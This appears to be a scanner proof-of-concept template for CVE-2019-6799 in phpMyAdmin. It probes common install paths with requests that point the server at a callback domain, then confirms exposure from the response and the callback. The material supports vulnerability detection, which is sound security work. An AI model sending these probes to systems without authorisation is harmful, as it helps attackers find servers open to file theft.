name: yaml-poc-phpmyadmin-phpmyadmin-leak-CVE-2019-6799
binding: 2812b1f4-9112-4759-ba3e-e84d8234c047
detail:
    author: jiapeng.han
    links:
        - http://www.securityfocus.com/bid/106736
        - https://lists.debian.org/debian-lts-announce/2019/02/msg00039.html
        - https://nvd.nist.gov/vuln/detail/CVE-2019-6799
        - https://packetstormsecurity.com/files/160149/Ubuntu-Security-Notice-USN-4639-1.html
        - https://www.auscert.org.au/bulletins/76214
        - https://www.auscert.org.au/bulletins/ESB-2020.4193/
        - https://www.phpmyadmin.net/security/PMASA-2019-1/
        - https://www.securityfocus.com/bid/106736
    vulnerability:
        id: 76840728-ee32-4b51-86c7-008280864d30
        level: medium
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
    rStr0: randomLowercase(27)
    rStr1: randomLowercase(27)
payloads:
    payloads:
        aimp1:
            path: |
                "index.php"
        aimp2:
            path: |
                "pma/index.php"
        aimp3:
            path: |
                "pmd/index.php"
        aimp4:
            path: |
                "phpMyAdmin/index.php"
        aimp5:
            path: |
                "phpmyadmin/index.php"
        aimp6:
            path: |
                "_phpmyadmin/index.php"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /{{path}}?pma_servername={{reverseDomain}}&pma_username={{rStr0}}&pma_password={{rStr1}}&server=1
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("mysqli_real_connect") && reverse.wait(5)
expression: r0()
